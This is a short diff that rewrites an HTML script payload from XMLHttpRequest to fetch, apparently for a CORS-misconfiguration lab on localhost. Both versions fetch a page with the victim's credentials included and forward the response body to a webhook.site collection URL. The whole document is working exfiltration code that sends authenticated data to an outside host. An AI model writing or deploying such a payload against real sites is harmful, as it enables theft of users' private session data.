@@ -1,11 +1,13 @@
 <script>
-var req = new XMLHttpRequest();
-req.onload = reqListener;
-req.open('get','http://127.0.0.1:5000/',true);
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-	location='http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?source='+this.responseText;
-};
+fetch("http://127.0.0.1:5000/", {
+    method: "GET",
+    credentials: "include",
+    headers: {
+        "Origin": "http://webhook.site/"
+    }
+})
+.then(response => response.text())
+.then(data => {
+    fetch("http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?source=" + encodeURIComponent(data));
+});
 </script>
